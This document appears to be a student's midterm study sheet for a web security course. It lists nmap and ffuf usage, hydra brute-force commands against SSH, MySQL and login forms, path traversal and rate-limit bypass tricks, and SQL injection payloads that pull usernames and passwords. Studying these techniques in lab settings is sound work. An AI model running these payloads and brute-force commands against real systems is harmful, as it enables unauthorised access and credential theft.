# MidTerm Stuff

`nmap -v1 localhost` - Scan top 100 ports.
`nmap -sV localhost` - Service fingerprinting.  
`nmap -sV -sC localhost` - Run scripts in default category.  
`nmap -sV -script <type> localhost` - Run scripts in <type> category.  

`ffuf -u <http://target-url> -w <wordlist>`
  + `FUZZ` in payload gets replaced by stuff in wordlists.
  + `-r` follow redirects.
  + `-X <method>` http method.
  + `-mc 200-299,301` http status codes to match.
  + `ffuf -u http://localhost:9000/FUZZ -r -w <wordlist>`  
`ffuf -u <url> -X POST -H "<Header>: <Value>" -d "?uname=abc&pwd=FUZZ OR json data"`  

### File Attacks

+ Fuzzer useful for all
+ Open Redirect
+ Local File inclusion
+ Directory/Path traversal
  - Multiple `../../../`
  - Multiple `......`
  - Leading or no leading `/`
  - Encoded versions
  - Double (or multiple) escapes/leading '/'
+ Consider sources of attack:
  - URL
  - HTML Attributes
  - HTTP Post Data
  - Cookies
  - Database Data
  - User Input
+ Looking for:
  - sys files (usernames, hashed passwords, possible services (config files))
  - app source code (may have db passwords, api keys)
  - sensitive data database contents
+ [`/proc` stuff](https://docs.google.com/presentation/d/1lP0_OJQ0rZo0oMeR6apAzTnEMjMl-5ufzEkyk2RdaUY/edit#slide=id.g29ea2f95244_0_9)

### Broken Auth/Access Control

+ Consider error messages.
+ Consider returned status codes.
+ Brute force.
+ Dictionary attacks.
+ Dictionary + Mutations.

`hydra -l <username> -P <password-list> <base-url>`  
`hydra -l <...> -P <...> ssh://<ip-address>`  
`hydra -l <...> -P <...> <host-ip> mysql` - mysql login  
`hydra -l <user> -P <pass-list> localhost:9000 http-post-form "login-page.php:login=^USER^&password=^PASS^:H=Cookie: PHPSESSID=<abcdef>; other=blah:F=Invalid"`  
`hydra -l bee -x 3:3:abcug -y -f localhost http-post-form "/ba_pwd_attacks_1.php:login=^USER^&password=^PASS^&form=submit:H=Cookie: PHPSESSID=ardlvcaurvgd27mu5t8oeafql7; security_level=0:F=Invalid"`  
See: https://github.com/CSCI3540U/lab-06-Jaime-Barillas/blob/main/steps.md?plain=1  
Or use burpsuite intruder

+ Bypass rate limits linked to user:
  - abc@gmail.com%20
  - abc@gmail.com%00
  - %0a, %0d, %0a%0d, %09, %0c, %20%20
+ Same password but different emails.
+ gmail '+' plus addressing

Side Note: Double escaping urlencode: %25 = "%" i.e. %2500 when decoded = "%00"

`hashcat --force <password-list> -r </usr/share/hashcat/rules/...> --stdout | sort -u`

+ Password reset attacks: Reset token may be leaked in Referer HTTP header for ad tracking requests.
+ Pass the Hash attacks.

#### IDOR

+ `/order-status?id=1772` -> try: `/order-status?id=1771`
+ potentially references to:
  - DB data.
  - In memory stuff.
  - Files.
  - etc.

#### Session Attacks

+ Guessing the session id.

#### Privilege Escalation

+ Role based: is the role stored in a cookie or parameter?
+ Bypass form, submit post data to endpoint (maybe the don't secure the endpoint?)
+ Change e-mail address or password.

### SQL Injection

`abc' OR 1=1 --`  
`' UNION SELECT * FROM <table>`  
+ [SQLMap stuff](https://docs.google.com/presentation/d/1m4mrYgWkYpODDIoGm5Sx4tPQmmLC5H0kI85AF_aBGQc/edit#slide=id.g2afd1e15106_0_254)
+ Store SQLi.
+ Blind SQLi.
+ When exploiting:
  - SELECT statements:
    * WHERE clause
    * table or column name
    * ORDER BY clause
  - UPDATE:
    * the updated values
    * WHERE clause
  - INSERT:
    * the inserted values
+ Common Variants:
  - Viewing hidden data:
    * `SELECT * from tbl where color = 'green' AND membersOnly = 0` =>
    * `SELECT * from tbl where color = 'green' AND membersOnly = 1 --' membersOnly = 0`
  - Viewing structure of database:
    * `SELECT uname FROM Login WHERE uname = 'bsmith' AND password IN (SELECT TABLE_NAME FROM information_schema.tables) --AND password=''`
  - Viewing data from other tables:
    * `SELECT title, description FROM Products WHERE category = 'Electronics' UNION SELECT username, password FROM Login--'`
+ Discovering Database brand/version:
  - SQL Server, MySQL, MariaDB - SELECT @@version
  - Oracle - SELECT banner FROM v$version
  - PostgreSQL - SELECT version()
+ Finding names of tables in database:
  - `... UNION SELECT TABLE_NAME FROM information_schema.tables--`
+ Finding number of columns in a table:
  - `... UNION SELECT * FROM table ORDER BY 1-- 2, 3, etc.`
+ Select multiple columns:
  - `... UNION SELECT col1 || '|' || col2 FROM sometable--`
+ [More (hacktricks)](https://book.hacktricks.xyz/pentesting-web/sql-injection)

